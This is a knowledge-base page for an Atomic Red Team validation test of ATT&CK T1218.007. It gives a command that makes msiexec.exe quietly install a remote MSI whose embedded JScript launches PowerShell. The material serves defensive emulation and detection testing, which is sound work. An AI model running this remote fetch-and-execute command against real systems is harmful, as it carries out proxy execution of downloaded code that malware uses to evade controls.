---
atomic_guid: "44a4bedf-ffe3-452e-bee4-6925ab125662"
title: "Msiexec.exe - Execute Remote MSI file"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.007"
attack_technique_name: "Signed Binary Proxy Execution: Msiexec"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "44a4bedf-ffe3-452e-bee4-6925ab125662"
  - "Msiexec.exe - Execute Remote MSI file"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Msiexec.exe - Execute Remote MSI file

Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.

## Metadata

- Atomic GUID: 44a4bedf-ffe3-452e-bee4-6925ab125662
- Technique: T1218.007: Signed Binary Proxy Execution: Msiexec
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1218.007/T1218.007.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.007]]

## Input Arguments

### msi_exe

- description: MSIExec File Path
- type: path
- default: c:\windows\system32\msiexec.exe

### msi_payload

- description: MSI file to execute
- type: string
- default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi

## Executor

- name: command_prompt

### Command

```cmd
#{msi_exe} /q /i "#{msi_payload}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.yaml)
